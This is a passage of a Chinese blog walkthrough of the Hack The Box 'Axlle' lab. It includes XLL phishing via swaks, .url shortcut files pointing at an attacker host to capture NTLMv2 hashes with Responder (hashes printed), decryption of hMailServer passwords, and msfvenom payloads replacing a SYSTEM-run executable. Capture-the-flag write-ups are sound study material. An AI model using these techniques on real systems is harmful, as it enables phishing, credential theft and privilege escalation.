tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">50741/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">56294/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">56309/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">62593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">62594/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>ldap看了下域名</p>
<p>ldapsearch</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">serverName: CN=MAINFRAME,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Con</span><br><span class="line"> figuration,DC=axlle,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=axlle,DC=htb</span><br><span class="line">namingContexts: DC=axlle,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=axlle,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=axlle,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=axlle,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=axlle,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 156257</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=MAINFRAME,CN=Servers,CN=Default-First-Site-</span><br><span class="line"> Name,CN=Sites,CN=Configuration,DC=axlle,DC=htb</span><br><span class="line">dnsHostName: MAINFRAME.axlle.htb</span><br><span class="line">defaultNamingContext: DC=axlle,DC=htb</span><br><span class="line">currentTime: 20240623021359.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=axlle,DC=htb</span><br></pre></td></tr></table></figure>

<p>smb没有匿名的可以看<br>所以入口大概率是web部分</p>
<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>dns爆出来一个<code>mainframe.axlle.htb</code>.</p>
<p>dir没有爆破出什么有用的路径.</p>
<p><img src="/wpimages/2024/Axlle/web1.jpg" alt="web1"></p>
<p>这个web翻过了，就上面的文字有些线索。</p>
<p>他说自己邮箱只接受execl格式的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture.</span><br></pre></td></tr></table></figure>

<p>但同时不能用宏，根据这个线索可以联想到xls的xll以及doc的dde之类钓鱼。</p>
<p><a target="_blank" rel="noopener" href="https://threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-infect-systems/">https://threatresearch.ext.hp.com/how-attackers-use-xll-malware-to-infect-systems/</a></p>
<p>所以找个xll的项目，这个xll本身其实就是个dll，不过execl可以直接运行，这里很符合他的宏禁用情况下同时还是execl执行的限制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attackers usually place their code in the xlAutoOpen function, which is executed immediately when the add-in is activated. What makes this technique dangerous is that only one click is required to run the malware, unlike VBA macros which require the user to disable Microsoft Office’s Protected View and enable macro content. However, XLL files are portable executables that follow the format of dynamic link libraries (DLLs) which many email gateways already block.</span><br></pre></td></tr></table></figure>

<p>文章中也有指出<code>xlAutoOpen</code>这个函数是利用的重点之一。</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/office/client-developer/excel/xlautoopen">https://learn.microsoft.com/en-us/office/client-developer/excel/xlautoopen</a></p>
<p>可以看一下官方对其的介绍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Remarks</span><br><span class="line">Microsoft Excel calls xlAutoOpen whenever the XLL is activated. The XLL is activated in the following situations:</span><br><span class="line"></span><br><span class="line">At the start of an Excel session if it was active in the last Excel session that ended normally.</span><br><span class="line"></span><br><span class="line">If loaded during an Excel session.</span><br><span class="line"></span><br><span class="line">An XLL can be loaded in several ways:</span><br><span class="line"></span><br><span class="line">By choosing Open on the File menu (where the version of Excel supports this method of loading XLLs).</span><br><span class="line"></span><br><span class="line">Using the Add-In Manager.</span><br><span class="line"></span><br><span class="line">From another XLL that calls xlfRegister with the name of this DLL as the only argument.</span><br><span class="line"></span><br><span class="line">From an XLM macro sheet that calls REGISTER with the name of this DLL as the only argument.</span><br><span class="line"></span><br><span class="line">If the add-in is deactivated and reactivated during an Excel session, this function is called on reactivation.</span><br></pre></td></tr></table></figure>

<p>简单来说这个函数在打开时会被调用，也就是说其作为一个dll文件中的函数会被在一开始就调用。</p>
<p>所以我们这里其实有两种思路来实现RCE，一个是利用上面他说的<code>xlAutoOpen</code>接口来做，另一个是利用其本身<code>dll</code>的特性，在加载时候就执行即可。</p>
<p>这里我用的项目是</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/moohax/xllpoc">https://github.com/moohax/xllpoc</a></p>
</blockquote>
<p>我把执行丢在了dll执行时候.</p>
<p><img src="/wpimages/2024/Axlle/web2.jpg" alt="web2"></p>
<p>这样编译会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误	C4716	“xlAutoOpen”: 必须返回一个值	XLL_POC	</span><br></pre></td></tr></table></figure>

<p>然后回头给<code>XLL_POC.cpp</code> <code>return</code>一个值就ok</p>
<p>然后编译完了就用<code>swaks</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to accounts@axlle.htb  --from <span class="built_in">test</span>@axlle.htb --header <span class="string">&quot;Subject: testt&quot;</span> --body <span class="string">&quot;testt&quot;</span> --server axlle.htb --attach @poc.xll</span><br></pre></td></tr></table></figure>

<p>丢过去就ok。</p>
<p>等一会就会收到<code>axlle\gideon.hamill</code>用户的shell</p>
<h2 id="gideon-hamill-dallon-matrix"><a href="#gideon-hamill-dallon-matrix" class="headerlink" title="gideon.hamill -&gt; dallon.matrix"></a>gideon.hamill -&gt; dallon.matrix</h2><p>进来之后收集了一下用户名，考虑到可能之后会有撞的时候。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">baz.humphries</span><br><span class="line">brad.shaw</span><br><span class="line">calum.scott</span><br><span class="line">dallon.matrix</span><br><span class="line">dan.kendo</span><br><span class="line">gideon.hamill</span><br><span class="line">jacob.greeny</span><br><span class="line">lindsay.richards</span><br><span class="line">Public</span><br><span class="line">simon.smalls</span><br><span class="line">trent.langdon</span><br></pre></td></tr></table></figure>

<p>然后这个用户家目录下其实没啥东西，但是考虑到他本身有hmailserver，所以找了一下服务目录。</p>
<p>在其中找到了一个<code>hMailServer.INI</code>包含了一部分用户密码，不过是加密过的。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hMailServer\Bin&gt; <span class="built_in">cat</span> hMailServer.INI</span><br><span class="line">[<span class="type">Directories</span>]</span><br><span class="line">ProgramFolder=C:\Program Files (x86)\hMailServer</span><br><span class="line">DatabaseFolder=C:\Program Files (x86)\hMailServer\Database</span><br><span class="line">DataFolder=C:\Program Files (x86)\hMailServer\Data</span><br><span class="line">LogFolder=C:\Program Files (x86)\hMailServer\Logs</span><br><span class="line">TempFolder=C:\Program Files (x86)\hMailServer\Temp</span><br><span class="line">EventFolder=C:\Program Files (x86)\hMailServer\Events</span><br><span class="line">[<span class="type">GUILanguages</span>]</span><br><span class="line">ValidLanguages=english,swedish</span><br><span class="line">[<span class="type">Security</span>]</span><br><span class="line">AdministratorPassword=<span class="number">52</span>a1b2a1211e690998e0d2ccb653ff22</span><br><span class="line">[<span class="type">Database</span>]</span><br><span class="line"><span class="built_in">Type</span>=MSSQLCE</span><br><span class="line">Username=</span><br><span class="line">Password=<span class="number">52</span>abe4d2e16269ddddf7b166218e92d9</span><br><span class="line">PasswordEncryption=<span class="number">1</span></span><br><span class="line">Port=<span class="number">0</span></span><br><span class="line">Server=</span><br><span class="line">Database=hMailServer</span><br><span class="line">Internal=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后翻了翻邮件发现其中包含了一个邮件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\<span class="number">2</span>f&gt; <span class="built_in">cat</span> <span class="string">&quot;&#123;2F7523BD-628F-4359-913E-A873FCC59D0F&#125;.eml&quot;</span></span><br><span class="line"><span class="keyword">Return</span><span class="literal">-Path</span>: webdevs@axlle.htb</span><br><span class="line">Received: from bumbag (Unknown [<span class="number">192.168</span><span class="type">.77.153</span>])</span><br><span class="line">        by MAINFRAME with ESMTP</span><br><span class="line">        ; Mon, <span class="number">1</span> Jan <span class="number">2024</span> <span class="number">06</span>:<span class="number">32</span>:<span class="number">24</span> <span class="literal">-0800</span></span><br><span class="line">Date: Tue, <span class="number">02</span> Jan <span class="number">2024</span> <span class="number">01</span>:<span class="number">32</span>:<span class="number">23</span> +<span class="number">1100</span></span><br><span class="line">To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb</span><br><span class="line">From: webdevs@axlle.htb</span><br><span class="line">Subject: OSINT Application Testing</span><br><span class="line">Message<span class="literal">-Id</span>: &lt;<span class="number">20240102013223.019081</span>@bumbag&gt;</span><br><span class="line">X<span class="literal">-Mailer</span>: swaks v20201014.<span class="number">0</span> jetmore.org/john/code/swaks/</span><br><span class="line"></span><br><span class="line">Hi everyone,</span><br><span class="line"></span><br><span class="line">The Web Dev <span class="built_in">group</span> is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.</span><br><span class="line"></span><br><span class="line">We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.</span><br><span class="line"></span><br><span class="line">Yours <span class="keyword">in</span> click<span class="literal">-worthy</span> URLs,</span><br><span class="line"></span><br><span class="line">The Web Dev Team</span><br></pre></td></tr></table></figure>

<p>这里内容是他们搞了个自动点击的应用，会自动点击<code>C:\inetpub\testing</code>下的<code>web shortcuts</code>（需要注意<code>web shortcuts</code>不是指lnk，这里是指向url的.url文件）.</p>
<p>然后这楼里邮件里的用户名也简单拿了一下可能会有用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dallon.matrix</span><br><span class="line">calum.scott</span><br><span class="line">trent.langdon</span><br><span class="line">dan.kendo</span><br><span class="line">david.brice</span><br><span class="line">frankie.rose</span><br><span class="line">samantha.fade</span><br><span class="line">jess.adams</span><br><span class="line">emily.cook</span><br><span class="line">phoebe.graham</span><br><span class="line">matt.drew</span><br><span class="line">xavier.edmund</span><br><span class="line">baz.humphries</span><br><span class="line">jacob.greeny</span><br><span class="line">webdevs</span><br></pre></td></tr></table></figure>

<p>所以现在手头可以做的有两件事：</p>
<ul>
<li>1.解密<code>hmailserver.ini</code>中的密码。</li>
<li>2.从他的自动化点击上做点啥，比如smb拿hash或者别的玩法。</li>
</ul>
<p>首先是解密，这里我用了两个项目，因为我怀疑解密出来的东西不对..最后又改了一下他本地发现的一个密码解密文件，后来发现这是个兔子洞，密码都没用上。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/mvdnes/hm_decrypt">https://github.com/mvdnes/hm_decrypt</a><br><a target="_blank" rel="noopener" href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter">https://github.com/GitMirar/hMailDatabasePasswordDecrypter</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./decrypt 52abe4d2e16269ddddf7b166218e92d9</span><br><span class="line">4A02D41C55AC </span><br></pre></td></tr></table></figure>

<p>这个是<code>MSSQLCE</code>的密码，<code>administator</code>的是一串乱码。</p>
<p>不过还是拿着<code>mssqlce</code>的密码去撞了一下上面收集到的用户，然后并没有出货。</p>
<p>所以选择尝试第二条路写个<code>.url</code>丢去<code>C:\inetpub\testing</code>投毒拿<code>htlmhash</code>啥的。</p>
<p>文件格式可以这么写，我一开始尝试了<code>smb:\\</code>它不支持，<code>file://</code>行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=file://10.10.xx.xx/</span><br></pre></td></tr></table></figure>

<p>或者直接用powershell也可以</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;\\10.10.16.x\&quot;</span></span><br><span class="line"><span class="variable">$shortcutPath</span> = <span class="string">&quot;./test.url&quot;</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$shortcut</span> = <span class="variable">$shell</span>.CreateShortcut(<span class="variable">$shortcutPath</span>)</span><br><span class="line"><span class="variable">$shortcut</span>.TargetPath = <span class="variable">$filePath</span></span><br><span class="line"><span class="variable">$shortcut</span>.Save()</span><br></pre></td></tr></table></figure>


<p>我也试过这个</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.url">https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.url</a></p>
</blockquote>
<p>icon的不知道为啥没反应，怪怪的。</p>
<p>然后本地<code>responder</code>等他点击就收到了<code>hash</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.29.242                                                                                                   [SMB] NTLMv2-SSP Username : AXLLE\dallon.matrix                                      [SMB] NTLMv2-SSP Hash     : dallon.matrix::AXLLE:0679f365f951f30c:2978E5AD3222E13C491CE58EBBBDD1CA:01010000000000008023DF270EC5DA01665A5A85E990C5E60000000002000800500056003300580001001E00570049004E002D003500520057003900480046004E00490030004300360004003400570049004E002D003500520057003900480046004E0049003000430036002E0050005600330058002E004C004F00430041004C000300140050005600330058002E004C004F00430041004C000500140050005600330058002E004C004F00430041004C00070008008023DF270EC5DA0106000400020000000800300030000000000000000100000000200000AEEE4334555C9C00725FBA4B8</span><br><span class="line">7A9DD5C13B1E6F443716644AE6757FBDA1DA3800A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002</span><br><span class="line">E0033000000000000000000              </span><br><span class="line">                                 </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.29.242                                                                                                   [SMB] NTLMv2-SSP Username : AXLLE\Administrator                                                                                             [SMB] NTLMv2-SSP Hash     : Administrator::AXLLE:11de9e88fb716584:6EF51DAF63AF2CEB92C6E9D0F71B37A7:01010000000000008023DF270EC5DA01967365F766DDC2090000000002000800500056003300580001001E00570049004E002D003500520057003900480046004E00490030004300360004003400570049004E002D003500520057003900480046004E0049003000430036002E0050005600330058002E004C004F00430041004C000300140050005600330058002E004C004F00430041004C000500140050005</span><br><span class="line">600330058002E004C004F00430041004C00070008008023DF270EC5DA0106000400020000000800300030000000000000000000000000300000AEEE4334555C9C00725FBA4B8</span><br><span class="line">7A9DD5C13B1E6F443716644AE6757FBDA1DA3800A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002</span><br><span class="line">E0033000000000000000000</span><br></pre></td></tr></table></figure>

<p>神奇的是居然还有<code>admin</code>的hash出现..不过这两个hash都跑不出密码.</p>
<p>然后这边卡了一段时间，之后思考了一下重新看了一下mail的内容，他这句有点让我产生了一些想法<code>Yours in click-worthy URLs</code>，也就是说他会把我的<code>.url</code>添加到网站后可能会有人去点击，那如果我给他一个逆天exe或者别的马子啥的，他也会点击然后执行吗。</p>
<p>所以用msfvemon生成了一个exe(奇怪的是正常的我生成执行有回连，但是执行没反应，所以最后用的exec来执行的命令).</p>
<p>监听一会之后就得到了<code>DALLON.MATRIX@AXLLE.HTB</code>用户的回连shell.</p>
<h2 id="68-65-x4c-x4c-x4f-78-x2e-77-65-x54-82-73-88-64-65-88-76-76-x45-46-72-x54-66-APP-DEVS"><a href="#68-65-x4c-x4c-x4f-78-x2e-77-65-x54-82-73-88-64-65-88-76-76-x45-46-72-x54-66-APP-DEVS" class="headerlink" title="&#68;&#65;&#x4c;&#x4c;&#x4f;&#78;&#x2e;&#77;&#65;&#x54;&#82;&#73;&#88;&#64;&#65;&#88;&#76;&#76;&#x45;&#46;&#72;&#x54;&#66; -&gt; APP DEVS"></a><a href="mailto:&#68;&#65;&#x4c;&#x4c;&#x4f;&#78;&#x2e;&#77;&#65;&#x54;&#82;&#73;&#88;&#64;&#65;&#88;&#76;&#76;&#x45;&#46;&#72;&#x54;&#66;">&#68;&#65;&#x4c;&#x4c;&#x4f;&#78;&#x2e;&#77;&#65;&#x54;&#82;&#73;&#88;&#64;&#65;&#88;&#76;&#76;&#x45;&#46;&#72;&#x54;&#66;</a> -&gt; APP DEVS</h2><p>溜了下狗</p>
<p><img src="/wpimages/2024/Axlle/bh1.jpg" alt="bh1"></p>
<p>看到<code>DALLON.MATRIX</code>用户所属的<code>WEB DEVS</code>组对<code>APP DEVS</code>组的两个用户有强制修改密码的权限。</p>
<p>所以选一个<code>APP DEVS</code>的倒霉蛋改一下密码。</p>
<p><code>Set-DomainUserPassword -Identity &quot;JACOB.GREENY&quot; -Verbose</code></p>
<p>因为这俩用户都在<code>remote management users</code>组里，直接<code>winrm</code>直接登录就ok</p>
<h2 id="APP-DEVS-root"><a href="#APP-DEVS-root" class="headerlink" title="APP DEVS -&gt; root"></a>APP DEVS -&gt; root</h2><p>这里看了下狗到这里就没啥线索了。</p>
<p>所以考虑应该是别的途径继续提权，然后就想起来一开始刚拿到第一个用户的shell时，翻目录时候再<code>c:/</code>下有一个<code>App Development</code>的目录，最初的用户ls看没有回显，考虑到可能是没有权限所以就搁置了。</p>
<p>因为这个用户所在的组叫做<code>appdev</code>所以返回去看了下这个应用目录，果然是可以访问了。</p>
<p>然后在目录中翻到了一个<code>readme</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\App Development\kbfiltr&gt; <span class="built_in">cat</span> README.md</span><br><span class="line"><span class="comment"># Keyboard Translation Program</span></span><br><span class="line">This is an application <span class="keyword">in</span> development that uses a WDF kbfiltr as the basis <span class="keyword">for</span> a translation program. The aim of this application is to allow users to program and simulate custom keyboard layouts <span class="keyword">for</span> real or fictional languages.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Features</span></span><br><span class="line">- Create custom keyboard layouts <span class="keyword">for</span> real or fictional languages.</span><br><span class="line">- Simulate keyboard inputs <span class="keyword">using</span> the custom layouts.</span><br><span class="line">- Secret codes to <span class="keyword">switch</span> between languages and logging output.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Progress</span></span><br><span class="line">- kbfiltr driver - Complete</span><br><span class="line">- Keyboard mapping - Complete (hardcoded <span class="keyword">in</span> driver)</span><br><span class="line">- Custom mapping <span class="keyword">in</span> application layer - <span class="keyword">In</span> progress</span><br><span class="line">- Logging - Complete</span><br><span class="line">- Activation of logging - Complete</span><br><span class="line">- Simulation of other keyboard layouts - Incomplete</span><br><span class="line">- Activation of other keyboard layouts - Incomplete</span><br><span class="line"></span><br><span class="line">**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver <span class="keyword">in</span> a standalone environment**</span><br><span class="line"></span><br><span class="line"><span class="comment">## Prerequisites</span></span><br><span class="line">- Windows <span class="number">10</span> or higher</span><br><span class="line">- Visual Studio <span class="number">2019</span></span><br><span class="line">- Windows Driver Kit (WDK) <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Getting Started</span></span><br><span class="line">- Clone this repository.</span><br><span class="line">- Open the solution file <span class="keyword">in</span> Visual Studio.</span><br><span class="line">- Build the solution <span class="keyword">in</span> Release mode.</span><br><span class="line">- Install the driver by running `.\devcon.exe install .\kbfiltr.inf <span class="string">&quot;*PNP0303&quot;</span>` as Administrator.</span><br><span class="line">- Install the driver as an upperclass <span class="keyword">filter</span> with `.\devcon.exe /<span class="built_in">r</span> classfilter keyboard upper <span class="literal">-keylogger</span>` as Administrator.</span><br><span class="line">- Install the application by running the install_app.bat file as Administrator.</span><br><span class="line">- Reboot your computer to load the driver.</span><br><span class="line">- Launch the application and <span class="built_in">start</span> programming your custom keyboard layouts.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Usage</span></span><br><span class="line"><span class="comment">### Programming a Custom Layout</span></span><br><span class="line">- Launch the application.</span><br><span class="line">- Click on the Program Layout button.</span><br><span class="line">- <span class="built_in">Select</span> the language <span class="keyword">for</span> which you want to program the layout.</span><br><span class="line">- <span class="built_in">Select</span> the key you want to modify from the list.</span><br><span class="line">- Modify the key<span class="string">&#x27;s scancode and virtual key code as required.</span></span><br><span class="line"><span class="string">- Repeat steps 4 and 5 for all the keys you want to modify.</span></span><br><span class="line"><span class="string">- Save the layout by clicking on the Save Layout button.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Simulating Inputs</span></span><br><span class="line"><span class="string">- Launch the application.</span></span><br><span class="line"><span class="string">- Click on the Simulate Input button.</span></span><br><span class="line"><span class="string">- Select the language for which you want to simulate the input.</span></span><br><span class="line"><span class="string">- Type in the input in the normal English layout.</span></span><br><span class="line"><span class="string">- Trigger language switch as outlined below (when required).</span></span><br><span class="line"><span class="string">- Verify that the input is translated to the selected language.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### Logging Output</span></span><br><span class="line"><span class="string">- Launch the application.</span></span><br><span class="line"><span class="string">- Turn on logging (shortcuts can be created as explained below)</span></span><br><span class="line"><span class="string">- Use the application as normal.</span></span><br><span class="line"><span class="string">- The log file will be created in the same directory as the application.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## Triggering/Activation</span></span><br><span class="line"><span class="string">- To toggle logging output, set up a shortcut in the options menu. INCOMPLETE</span></span><br><span class="line"><span class="string">- To switch to a different language, press the Left Alt key and the Right Ctrl key simultaneously. INCOMPLETE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## Bugs</span></span><br><span class="line"><span class="string">There are probably several.</span></span><br></pre></td></tr></table></figure>

<p>总的来说就是他们有一个在开发中的应用，不过我比较关注这几个部分</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">- Install the driver by running `.\devcon.exe install .\kbfiltr.inf <span class="string">&quot;*PNP0303&quot;</span>` as Administrator.</span><br><span class="line">- Install the driver as an upperclass <span class="keyword">filter</span> with `.\devcon.exe /<span class="built_in">r</span> classfilter keyboard upper <span class="literal">-keylogger</span>` as Administrator.</span><br><span class="line">- Install the application by running the install_app.bat file as Administrator.</span><br><span class="line"></span><br><span class="line">**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\<span class="number">10</span>\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver <span class="keyword">in</span> a standalone environment**</span><br></pre></td></tr></table></figure>

<p>安装他的这个应用开发环境需要以<code>admin</code>权限，不过我看他已经装好了，所以这个留作备选。</p>
<p>其次是他写了个自动运行的东西用<code>admin</code>权限执行<code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</code>来自动测试和debug这个驱动，</p>
<p>所以这里我先去他这个应用目录下考虑尝试对他<code>standalonerunner.exe</code>看看有没有写入权限</p>
<p>直接一个<code>echo 1 &gt; standalonerunner.exe</code>.</p>
<p>然后就发现确实是有写入权限，内容变了。</p>
<p>他目录下还有一个<code>standalonerunner.dll</code>不过我懒得去看他被调用了啥函数..既然有exe的写入权限就优先尝试替换<code>.exe</code>.</p>
<p>因为msfvemon我那个正常的有问题，所以这里还是用的<code>msfvenom -a x64 --platform Windows -p windows/exec CMD=&quot;powershell ...&quot; -f exe &gt; standalonerunner.exe</code></p>
<p>然后等了一会发现文件被清了..可能是有脚本在重置目录，所以又传上去了一次，等了一会get root</p>
<hr>
<p>如果您喜欢我的文章，可以关注我喜欢的vsinger(XD</p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCBLGjbYv6-xxju1i44RjnnA">https://www.youtube.com/channel/UCBLGjbYv6-xxju1i44RjnnA</a></p>

        
      </div>

         
    </div>
    
     
